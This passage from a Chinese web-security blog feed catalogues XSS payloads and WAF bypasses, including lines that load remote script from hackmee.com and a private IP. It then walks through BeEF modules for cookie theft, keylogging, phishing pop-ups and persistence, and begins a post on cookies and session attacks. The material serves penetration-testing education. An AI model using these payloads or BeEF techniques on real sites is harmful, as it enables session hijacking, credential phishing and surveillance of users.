class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplaying</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>有关HTML的事件可以参考：<a href="http://help.dottoro.com/lhwfcplu.php">http://help.dottoro.com/lhwfcplu.php</a></p>
</blockquote>
<h2 id="基于CSS事件的XSS"><a href="#基于CSS事件的XSS" class="headerlink" title="基于CSS事件的XSS"></a>基于CSS事件的XSS</h2><p>不幸的是，基于CSS来实现XSS现在已经越来越难了，我尝试过的所有向量目前都只能在非常旧的浏览器上工作。因此，下面介绍的是基于CSS来触发XSS的情况。</p>
<p>下面的例子使用的是style标签来为动画的开始和结束设置关键帧：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="keyword">@keyframes</span> x &#123;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;animation: x;&quot;</span> <span class="attr">onanimationstart</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;animation: x;&quot;</span> <span class="attr">onanimationend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="基于伪协议的XSS"><a href="#基于伪协议的XSS" class="headerlink" title="基于伪协议的XSS"></a>基于伪协议的XSS</h2><p>伪协议不同于在因特网上广泛使用的如 <a href="http://、https://、ftp://，在URL中使用，用于执行特定的功能。">http://、https://、ftp://，在URL中使用，用于执行特定的功能。</a></p>
<ul>
<li>JavaScript伪协议：一般是通过<code>href</code>属性或者<code>src</code>属性结合<code>JavaScript伪协议</code>实现跨站脚本。</li>
<li>data伪协议：一般是通过<code>data</code>属性结合<code>data伪协议</code>实现跨站脚本。</li>
</ul>
<p>使用示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>javascript伪协议<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:,alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">brute</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>click		//firefox可执行</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">click</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">value</span>=<span class="string">click</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">xlink:href</span>=<span class="string">data:,alert(1)</span> /&gt;</span><span class="javascript">		<span class="comment">//firefox可执行</span></span></span><br><span class="line"><span class="javascript"></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：在safari浏览器中a标签的href属性也可以使用data伪协议。</p>
</blockquote>
<h2 id="自定义标签构造的XSS"><a href="#自定义标签构造的XSS" class="headerlink" title="自定义标签构造的XSS"></a>自定义标签构造的XSS</h2><h3 id="tabindex-属性"><a href="#tabindex-属性" class="headerlink" title="tabindex 属性"></a>tabindex 属性</h3><ul>
<li><code>tabindex=正值</code>，表示元素是可聚焦的，并且可以通过键盘导航来访问到该元素。</li>
<li><code>tabindex=&quot;0&quot;</code> ，表示元素是可聚焦的，并且可以通过键盘导航来聚焦到该元素，它的相对顺序是当前处于的DOM结构来决定的。</li>
<li><code>tabindex=负值</code> (通常是tabindex=“-1”)，表示元素是可聚焦的，但是不能通过键盘导航来访问到该元素。</li>
</ul>
<p>使用示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="contenteditable属性"><a href="#contenteditable属性" class="headerlink" title="contenteditable属性"></a>contenteditable属性</h3><p>contenteditable 是一个枚举属性，表示元素是否可被用户编辑。 如果可以，浏览器会修改元素的部件以允许编辑。</p>
<p>使用示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span> <span class="attr">contenteditable</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="user-modify属性"><a href="#user-modify属性" class="headerlink" title="user-modify属性"></a>user-modify属性</h3><p>用来控制用户能否对页面文本进行编辑。与标签的contenteditable属性类似。（该属性在chrome下使用）</p>
<p><strong>-webkit-user-modify:</strong> read-only | read-write | read-write-plaintext-only</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">属性值</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">read-only</td>
<td>内容只读。</td>
</tr>
<tr>
<td style="text-align:left">read-write</td>
<td>内容可读写。(支持富文本)</td>
</tr>
<tr>
<td style="text-align:left">read-write-plaintext-only</td>
<td>内容可读写，但粘贴内容中的富文本格式（如文本的颜色、大小，图片等）会丢失。内容类似于以纯文本显示。</td>
</tr>
</tbody>
</table>
</div>
<p>使用示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wafbypass</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-user-modify:read-write&quot;</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="远程加载Payload"><a href="#远程加载Payload" class="headerlink" title="远程加载Payload"></a>远程加载Payload</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">使用src属性加载</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.123.42/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">DOM创建script标签，再利用src属性加载</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&quot;<span class="attr">appendChild</span>(<span class="attr">createElement</span>(&#x27;<span class="attr">script</span>&#x27;))<span class="attr">.src</span>=<span class="string">&#x27;http://192.168.123.42/xss.js&#x27;</span>&quot;)&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="非常规XSS构造"><a href="#非常规XSS构造" class="headerlink" title="非常规XSS构造"></a>非常规XSS构造</h2><h3 id="基于HTML上下文的多重反射XSS"><a href="#基于HTML上下文的多重反射XSS" class="headerlink" title="基于HTML上下文的多重反射XSS"></a>基于HTML上下文的多重反射XSS</h3><p>通常在网站中查找XSS时，我们会看到源代码中输入的不止一个反射，这对于绕过几种类型的过滤器非常有用。</p>
<h4 id="双反射（单输入）"><a href="#双反射（单输入）" class="headerlink" title="双反射（单输入）"></a>双反射（单输入）</h4><p>用于利用同一页面上的多个反射。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;onload=alert(1)&gt;&lt;svg/1=&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&gt;alert(1)&lt;/script&gt;&lt;script/1=&#x27;</span><br><span class="line"></span><br><span class="line">*/alert(1)&lt;/script&gt;&lt;script&gt;/*</span><br></pre></td></tr></table></figure>
<h4 id="三重反射（单输入）"><a href="#三重反射（单输入）" class="headerlink" title="三重反射（单输入）"></a>三重反射（单输入）</h4><p>用于利用同一页面上的多个反射。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*/alert(1)&quot;&gt;&#x27;onload=&quot;/*&lt;svg/1=&#x27;</span><br><span class="line"></span><br><span class="line">`-alert(1)&quot;&gt;&#x27;onload=&quot;`&lt;svg/1=&#x27;</span><br><span class="line"></span><br><span class="line">*/&lt;/script&gt;&#x27;&gt;alert(1)/*&lt;script/1=&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="双重和三重（多输入）"><a href="#双重和三重（多输入）" class="headerlink" title="双重和三重（多输入）"></a>双重和三重（多输入）</h4><p>用于在同一页面上利用多个输入反射。在HPP（HTTP参数污染）场景中也很有用，其中存在 重复参数的反射。第3个有效负载使用相同参数的逗号分隔反射。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=&lt;svg/1=&#x27;&amp;q=&#x27;onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">p=&lt;svg 1=&#x27;&amp;q=&#x27;onload=&#x27;/*&amp;r=*/alert(1)&#x27;&gt;</span><br><span class="line"></span><br><span class="line">q=&lt;script/&amp;q=/src=data:&amp;q=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h3 id="基于文件上传的XSS"><a href="#基于文件上传的XSS" class="headerlink" title="基于文件上传的XSS"></a>基于文件上传的XSS</h3><h4 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h4><p>当上传的文件名反映在目标页面的某处时使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;svg onload=alert(1)&gt;.gif</span><br></pre></td></tr></table></figure>
<h4 id="元数据-Metadata"><a href="#元数据-Metadata" class="headerlink" title="元数据 Metadata"></a>元数据 Metadata</h4><p>在上传文件的元数据反映在目标页面的某处时使用。它使用命令行exiftool （“$”是终 端提示符），可以设置任何元数据字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ exiftool -Artist=&#x27;&quot;&gt;&lt;svg onload=alert(1)&gt;&#x27;xss.jpeg</span><br></pre></td></tr></table></figure>
<h4 id="SVG文件"><a href="#SVG文件" class="headerlink" title="SVG文件"></a>SVG文件</h4><p>用于在上载图像文件时在目标上创建存储的XSS。将以下内容保存为 “xss.svg”。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="基于SQLi错误的XSS"><a href="#基于SQLi错误的XSS" class="headerlink" title="基于SQLi错误的XSS"></a>基于SQLi错误的XSS</h3><p>在可触发SQL错误消息的端点中使用（使用引号或反斜杠）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;1&lt;svg onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(1)&gt;//</span><br></pre></td></tr></table></figure>
<h3 id="基于XML的XSS"><a href="#基于XML的XSS" class="headerlink" title="基于XML的XSS"></a>基于XML的XSS</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">x:script</span> <span class="attr">xmlns:x</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">x:script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">x:script</span> <span class="attr">xmlns:x</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//hackmee.com/xss.js&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><p>ZP《XSS绕过+宝塔WAF绕过》</p>
</li>
<li><p>《XSS-Cheat-Sheet-2019-Edition-2》</p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA">深入探究浏览器编码及XSS Bypass (qq.com)</a></p>
</li>
<li><p><a href="https://segmentfault.com/a/1190000038468748#shareToWeibo|">问我Chrome浏览器的渲染原理（6000字长文） - SegmentFault 思否</a></p>
</li>
<li><p><a href="https://www.freebuf.com/articles/web/200180.html">看我如何绕过WAF的XSS检测机制 - FreeBuf网络安全行业门户</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS跨站脚本</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS攻击平台</title>
    <url>/post/467ebde5.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。这些攻击平台主要目的是为了演示XSS的危害，以及方便渗透测试使用。下面介绍了几个常见的XSS攻击平台。</p>
</blockquote>
<h2 id="开源的XSS平台项目"><a href="#开源的XSS平台项目" class="headerlink" title="开源的XSS平台项目"></a>开源的XSS平台项目</h2><h3 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS Platform"></a>XSS Platform</h3><p>XSS Platform 是一个非常经典的XSS渗透测试管理系统，原作者在2011年所开发，由于后来长时间没有人维护，导致目前在PHP7环境下无法运行。该项目作者将源码移植到了PHP7环境中，同时增加安装功能。</p>
<p>项目地址：<a href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a></p>
<h3 id="BlueLotus-XSSReceiver"><a href="#BlueLotus-XSSReceiver" class="headerlink" title="BlueLotus_XSSReceiver"></a>BlueLotus_XSSReceiver</h3><p>其安装起来相比较于xss-platform更加简单，如果说xss-platform是一个多人使用的堡垒，而BlueLotus_XSS更像是一个人使用的瑞士军刀。其界面布局清新、数据可阅读性好、IP获取准确、IP地址定位精准、轻量级（无需数据库）、对数据存储进行加密。</p>
<p>项目地址：<a href="https://github.com/asw3asw/BlueLotus_XSSReceiver">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></p>
<h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><p>Medusa是一个红队武器库平台，目前包括XSS平台、协同平台、CVE监控、免杀生成、DNSLOG、钓鱼邮件等功能。</p>
<p>项目地址：<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></p>
<p>官方文档：<a href="http://medusa.ascotbe.com/Documentation/#/">http://medusa.ascotbe.com/Documentation/#/</a></p>
<h2 id="在线的XSS平台"><a href="#在线的XSS平台" class="headerlink" title="在线的XSS平台"></a>在线的XSS平台</h2><ul>
<li>NGXPT：<a href="https://ngxpt.co/">https://ngxpt.co/</a></li>
<li>XSSYE：<a href="https://xssye.com/">https://xssye.com/</a></li>
<li>XSSSAQ：<a href="https://xssaq.com/">https://xssaq.com/</a></li>
<li>XSS.SB：<a href="https://xss.sb/">https://xss.sb/</a></li>
<li>XSS.PT：<a href="https://xss.pt/">https://xss.pt/</a></li>
</ul>
<p>并不推荐使用在线的XSS平台，毕竟敏感信息要传输到陌生人的服务器上，而且服务器端测试代码存在不可控性</p>
<h2 id="BeEF-XSS"><a href="#BeEF-XSS" class="headerlink" title="BeEF-XSS"></a>BeEF-XSS</h2><h3 id="BeEF-XSS的介绍"><a href="#BeEF-XSS的介绍" class="headerlink" title="BeEF-XSS的介绍"></a>BeEF-XSS的介绍</h3><p>BeEF-XSS，全称The Browser Exploitation Framework(浏览器攻击框架)，是一款非常强大的web框架攻击平台，集成了许多payload，可以实现许多功能！</p>
<p>BeEF的架构图如下：</p>
<p><img src="https://i.loli.net/2021/11/16/9ZTFWC3Or5aENdh.png" alt="img"></p>
<p>zombie即受害者浏览器。zombie 是被 hook的，如果浏览器访问有钩子（由 js 编写）的页面，就会被 hook，勾连的服务器会执行初始代码返回一些信息，接着 zombie 会每隔一段时间（默认为 1 秒）就会向BeEF 服务器发送一个请求，询问是否有新的代码需要执行。BeEF 服务器本质上就像一个 Web 应用，分为前端 UI 和，后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，BeEF 持有者可以通过浏览器来登录 BeEF 的后端管理 UI 或者切换到他的工作目录中使用脚本启动。</p>
<h3 id="BeEF-XSS使用的基本流程"><a href="#BeEF-XSS使用的基本流程" class="headerlink" title="BeEF-XSS使用的基本流程"></a>BeEF-XSS使用的基本流程</h3><p>第一次启动需要设置登录密码。</p>
<p><img src="https://i.loli.net/2021/11/16/tE8r9zloYZGwFi6.png" alt="image-20211116144858252"></p>
<p>登录页面，用户名为beef</p>
<p><img src="https://i.loli.net/2021/11/16/XZD4CNrHFeu82KL.png" alt="image-20211116145812328"></p>
<p>在漏洞页面中插入BeEF的hook脚本</p>
<p><img src="https://i.loli.net/2021/11/16/WSpwKDRn2MhZlYF.png" alt="image-20211116154259761"></p>
<p>在BeEF-XSS主页面中可以看到受害者的浏览器正式上线，接着就可以使用Command模块对其进行利用</p>
<p><img src="https://i.loli.net/2021/11/16/ZNwA9WE4bvoyfiQ.png" alt="image-20211116151644248"></p>
<p>BeEF-XSS主页面基本介绍：</p>
<ul>
<li><strong>Hocked Browers</strong><ul>
<li>online browers 在线浏览器</li>
<li>offline browers  离线浏览器</li>
</ul>
</li>
<li><strong>Detials</strong><ul>
<li>浏览器、插件版本信息，操作系统信息</li>
</ul>
</li>
<li><strong>Logs</strong><ul>
<li>浏览器动作：焦点变化，鼠标单击，信息输入</li>
</ul>
</li>
<li><strong>Commands</strong><ul>
<li>绿色模块：命令模块针对目标浏览器工作，并且受害者不可见</li>
<li>橙色模块：命令模块针对目标浏览器工作，但受害者可见</li>
<li>灰色模块：命令模块尚未针对该目标浏览器进行验证</li>
<li>红色模块：命令模块不适用目标浏览器，有些红色模块也可以执行</li>
</ul>
</li>
<li><strong>Network</strong><ul>
<li>能够自动生成网络拓扑图</li>
</ul>
</li>
</ul>
<h3 id="BeEF-XSS模块的利用"><a href="#BeEF-XSS模块的利用" class="headerlink" title="BeEF-XSS模块的利用"></a>BeEF-XSS模块的利用</h3><h4 id="弹窗提示"><a href="#弹窗提示" class="headerlink" title="弹窗提示"></a>弹窗提示</h4><p>可以使用alert或prompt进行弹窗。</p>
<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Alert Dialog</code></p>
<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Create Prompt Dialog</code></p>
<h4 id="获取Cookie值"><a href="#获取Cookie值" class="headerlink" title="获取Cookie值"></a>获取Cookie值</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Get Cookie</code></p>
<p><img src="https://i.loli.net/2021/11/16/Sy65orHOvLZfcYD.png" alt="image-20211116155936182"></p>
<p><img src="https://i.loli.net/2021/11/16/noVqJPFjh7Dr64s.png" alt="image-20211116160001489"></p>
<h4 id="网页重定向"><a href="#网页重定向" class="headerlink" title="网页重定向"></a>网页重定向</h4><p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser</code></p>
<p><img src="https://i.loli.net/2021/11/16/uBPUNIhR2nzLCAk.png" alt="image-20211116161448680"></p>
<p>受害者的网页便会重定向到我们给定的URL。</p>
<p>但是这样一来受害者的浏览器便会脱离BeEF的控制，那么我们可以使用iFrame框架的方式进行重定向。</p>
<p>使用模块：<code>Browser -&gt; Hooked Domain -&gt; Redirect Browser(iFrame)</code></p>
<p><img src="https://i.loli.net/2021/11/16/QXC8Exc6aIyfVze.png" alt="image-20211116161943261"></p>
<h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>使用模块：<code>Misc -&gt; iFrame Event Key Logger</code></p>
<p><img src="https://i.loli.net/2021/11/16/clirRFhVmI7xBgL.png" alt="image-20211116175226073"></p>
<p><img src="https://i.loli.net/2021/11/16/QYCIlZivHeAhzwa.png" alt="image-20211116175342133"></p>
<h4 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h4><p>使用模块：<code>Social Engineering -&gt; Clickjacking</code></p>
<p><img src="https://i.loli.net/2021/11/16/2hck7S1QxZmdaz6.png" alt="image-20211116164726334"></p>
<p>每当鼠标点击在页面上点击时，就会自动执行js代码。</p>
<h4 id="社工弹窗钓鱼"><a href="#社工弹窗钓鱼" class="headerlink" title="社工弹窗钓鱼"></a>社工弹窗钓鱼</h4><h5 id="Flash更新页面钓鱼"><a href="#Flash更新页面钓鱼" class="headerlink" title="Flash更新页面钓鱼"></a>Flash更新页面钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Fake Flash Update</code></p>
<p><img src="https://i.loli.net/2021/11/16/XfD1GcRbNiC79qz.png" alt="image-20211116165540546"></p>
<h5 id="通知栏钓鱼"><a href="#通知栏钓鱼" class="headerlink" title="通知栏钓鱼"></a>通知栏钓鱼</h5><p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Chrome）</code></p>
<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（Firefox）</code></p>
<p>使用模块：<code>Social Engineering -&gt; Notifaction Bar（IE）</code></p>
<h5 id="登录页面钓鱼"><a href="#登录页面钓鱼" class="headerlink" title="登录页面钓鱼"></a>登录页面钓鱼</h5><p><strong>Google Mail登录</strong></p>
<p>使用模块：<code>Social Engineering -&gt; Google Phishing</code></p>
<p><strong>弹窗登录</strong></p>
<p>弹窗页面有：Facebook、LinkedIn、Windows、YouTube、Yammer、IOS、Generic</p>
<p>使用模块：<code>Social Engineering -&gt; Pretty Theft</code></p>
<h4 id="持久化控制"><a href="#持久化控制" class="headerlink" title="持久化控制"></a>持久化控制</h4><h5 id="浏览器中间人攻击"><a href="#浏览器中间人攻击" class="headerlink" title="浏览器中间人攻击"></a>浏览器中间人攻击</h5><p>常规页面与MitB（浏览器中间人攻击）中毒页面的区别在于，MitB会异步加载资源，同时保持勾连活动。对于用户来说一切都好像在正常页面中操作一样，很难察觉到有异常。这里要注意一下，如果用户单击了跨域链接，MitB会在浏览器中打开一个新的标签页，并把响应的内容放在新的标签页。</p>
<p>使用模块：<code>Persistencr -&gt; Man-In-The-Browser</code></p>
<h5 id="IFrame内嵌框架"><a href="#IFrame内嵌框架" class="headerlink" title="IFrame内嵌框架"></a>IFrame内嵌框架</h5><p>IFrame是HTML中的一个标签，可以创建包含另外一个文档的内联框架。为了持久的控制，可以创建一个全屏（整个浏览器）的IFrame来把页面放进去。BeEF的作者建议如果想持久化，内嵌框架是首选方案，原因如下：第一，可以完全控制内嵌框架的DOM内容。第二，内嵌框架主要用于在当前页面嵌入其他文档的事实，为持久化提供了直接了当的方法。</p>
<p>使用模块：<code>Persistencr -&gt; CreateForeground iFrame</code></p>
<p>另外，BeEF还可以结合MSF进行渗透测试，这会在之后使用MSF的时候进行讲解。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>吴翰清 著《白帽子讲Web安全》</li>
<li><a href="https://blog.csdn.net/smli_ng/article/details/106067842">BeEF-XSS详细使用教程_星落的博客-CSDN博客_beef-xss</a></li>
<li><a href="https://www.cnblogs.com/csnd/p/11808028.html">BeEF的使用 - 墨鱼菜鸡 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.cnblogs.com/p0pl4r/p/11160387.html">xss利用——BeEF#stage2（初始并持续化控制） - p0pl4r - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>XSS跨站脚本</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS利用方式剖析</title>
    <url>/post/a27c520e.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>XSS跨站攻击是攻击者通过一些正常的站内交互途径，例如发布评论、添加文章、发送邮件和留言等，提交含有恶意JavaScript脚本的内容文本，如果服务端没有过滤和转义这些脚本，反而作为内容发布到Web页面上，当其他用户访问该页面的时候就会执行这些恶意脚本。</p>
<p>然而，伴随着XSS攻击技术的发展，原本的含义逐渐发生改变，如今XSS早已不再局限于“跨站”攻击的方式，而是一类利用恶意脚本发动注入式攻击的总称。</p>
</blockquote>
<h2 id="会话攻击"><a href="#会话攻击" class="headerlink" title="会话攻击"></a>会话攻击</h2><h3 id="Cookie基础介绍"><a href="#Cookie基础介绍" class="headerlink" title="Cookie基础介绍"></a>Cookie基础介绍</h3><p>简单来说，Cookie是用户浏览网页时候网站存储在用户机器上的小文本文件，文件里面记录了与用户相关的一些状态或者设置，比如用户名、ID、访问次数等，当用户下一次访问这个网站的时候，网站会先访问用户机器上对应的Cookie文件，并从中读取信息，以便于用户实现快速访问。</p>
<h4 id="Cookie的类型"><a href="#Cookie的类型" class="headerlink" title="Cookie的类型"></a>Cookie的类型</h4><ul>
<li>持久型Cookie：以文本形式存储在硬盘上，由浏览器存取</li>
<li>临时型Cookie：也称会话Cookie，存储在内存中，关闭浏览器后会立即消失</li>
</ul>
<h4 id="Cookie的操作"><a href="#Cookie的操作" class="headerlink" title="Cookie的操作"></a>Cookie的操作</h4><p><strong>查看Cookie</strong></p>
<p>可以通过Document对象访问Cookie，<code>document.cookie</code>。若要创建一个Cookie，只要将特定格式的字符串赋值给<code>document.cookie</code>即可。</p>
<p><img src="https://i.loli.net/2021/11/11/me7OjJ4NMwXhS9U.png" alt="image-20211111195803669"></p>
<p>也可按F12在浏览器的存储中查看cookie</p>
<p><img src="https://i.loli.net/2021/11/11/Gdgu9OcQCAXsrv3.png" alt="image-20211111200029108"></p>
<p><strong>创建Cookie</strong></p>
<p>创建一个Cookie，需要提供Cookie的名称、对应值、过期时间和相关路径等。</p>
<p>以<code>PHP</code>语言为例，使用<code>setcookie</code>函数创建与删除Cookie：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&#x27;user_id&#x27;</span>,<span class="number">123</span>);	<span class="comment">//创建一个Cookie变量user_id=123 </span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&#x27;user_id&#x27;</span>,<span class="number">0</span>,time()-<span class="number">1</span>);	<span class="comment">//删除Cookie变量（Cookie的Expire的值为过去时间）</span></span><br></pre></td></tr></table></figure>
<p>以JavaScript语言为例，使用<code>document.cookie</code>属性创建与删除Cookie：</p>
